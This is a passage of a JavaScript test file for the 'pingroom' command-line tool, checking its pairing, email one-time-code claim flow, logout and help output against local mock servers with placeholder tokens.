  const home = newHome();
  const { server, baseUrl } = await pairingServer([{ status: 'expired' }]);
  try {
    const { status, stdout } = await runAsync(
      ['--api', baseUrl],
      { PINGROOM_HOME: home, PINGROOM_FORCE_TTY: '1', COLUMNS: '120' },
      { stdin: '1\nn\n' },
    );
    assert.equal(status, 3);
    assert.match(stdout, /That code expired\./);
    assert.throws(() => readFileSync(join(home, 'credentials.json'), 'utf8'));
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('a narrow terminal degrades to the pair URL alone', async () => {
  const home = newHome();
  const { server, baseUrl } = await pairingServer([ACTIVE_PAIR]);
  try {
    const { status, stdout } = await runAsync(
      ['--api', baseUrl],
      { PINGROOM_HOME: home, PINGROOM_FORCE_TTY: '1', COLUMNS: '20' },
      { stdin: '1\n' },
    );
    assert.equal(status, 0);
    assert.doesNotMatch(stdout, /[█▄▀]/);
    assert.match(stdout, /Open: https:\/\/pingroom\.io\/app\/agents\/pair/);
    assert.match(stdout, /✓ Connected as/);
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('the email fallback claims over the unchanged claim/* endpoints', async () => {
  const home = newHome();
  const { server, baseUrl, received } = await questionServer({
    'POST /api/agent/auth': () => ({
      status: 200,
      body: { credential: 'pre_claim_jwt', credential_type: 'pre_claim', expires_in: 900 },
    }),
    'POST /api/agent/auth/claim/start': () => ({
      status: 200,
      body: { message: 'Claim email sent.', expires_in: 900 },
    }),
    'POST /api/agent/auth/claim/complete': (body) => (JSON.parse(body).otp === '040176'
      ? { status: 200, body: { credential: 'active_jwt', credential_type: 'active', expires_in: 0, handle: 'agt_email01', scopes: [] } }
      : { status: 400, body: { error: 'invalid_otp', message: 'Invalid or expired code.' } }),
  });
  try {
    const { status, stdout, stderr } = await runAsync(
      ['--api', baseUrl],
      { PINGROOM_HOME: home, PINGROOM_FORCE_TTY: '1' },
      { stdin: '2\nme@example.com\n111111\n040176\n' }, // one wrong code, then the right one
    );
    assert.equal(status, 0, stderr);
    assert.match(stdout, /Email me a code/);
    assert.match(stdout, /the page shows a 6-digit code/);
    assert.match(stderr, /Invalid or expired code/);
    assert.match(stdout, /✓ Connected as @agt_email01/);
    // No room comes back from the email flow, so the CLI says how to pick one.
    assert.match(stdout, /pingroom config set default_room/);

    const start = received.find((r) => r.path === '/api/agent/auth/claim/start');
    assert.equal(start.auth, 'Bearer pre_claim_jwt');
    assert.equal(JSON.parse(start.body).email, 'me@example.com');
    // Never draws a QR on this branch.
    assert.doesNotMatch(stdout, /[█▄▀]/);
    assert.equal(JSON.parse(readFileSync(join(home, 'credentials.json'), 'utf8')).token, 'active_jwt');
  } finally {
    server.close();
    rmSync(home, { recursive: true, force: true });
  }
});

test('logout clears the credential, and says so when there was none', () => {
  const home = newHome();
  try {
    const empty = run(['logout'], { PINGROOM_HOME: home });
    assert.equal(empty.status, 0);
    assert.match(empty.stdout, /no stored credential/);

    seedCredential(home, { token: 'stored_tok', handle: 'agt_ab12cd34ef' });
    const out = run(['logout'], { PINGROOM_HOME: home });
    assert.equal(out.status, 0);
    assert.match(out.stdout, /logged out \(@agt_ab12cd34ef\)/);
    assert.throws(() => readFileSync(join(home, 'credentials.json'), 'utf8'));

    // After logout the tool is back to "not connected", not half-authenticated.
    const after = run(['ask', '--room', 'ab12cd', '-p', 'Deploy?'], { PINGROOM_HOME: home });
    assert.equal(after.status, 2);
    assert.match(after.stderr, /agent token is required/);
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
});

test('logout warns that PINGROOM_TOKEN keeps overriding it', () => {
  const home = newHome();
  seedCredential(home, { token: 'stored_tok' });
  try {
    const { stdout } = run(['logout'], { PINGROOM_HOME: home, PINGROOM_TOKEN: 'env_tok' });
    assert.match(stdout, /PINGROOM_TOKEN is still set/);
  } finally {
    rmSync(home, { recursive: true, force: true });
  }
});

test('help documents the credential store, the precedence, and the absence of a login command', () => {
  const { stdout } = run(['--help']);
  assert.match(stdout, /~\/\.pingroom\/credentials\.json/);
  assert.match(stdout, /PINGROOM_HOME/);
  assert.match(stdout, /explicit flag\s+>\s+env var\s+>\s+~\/\.pingroom\/config\.json\s+>\s+built-in default/);
  assert.match(stdout, /There is no "login" command/);
  assert.match(stdout, /^  config   /m);
  assert.match(stdout, /^  logout   /m);
});
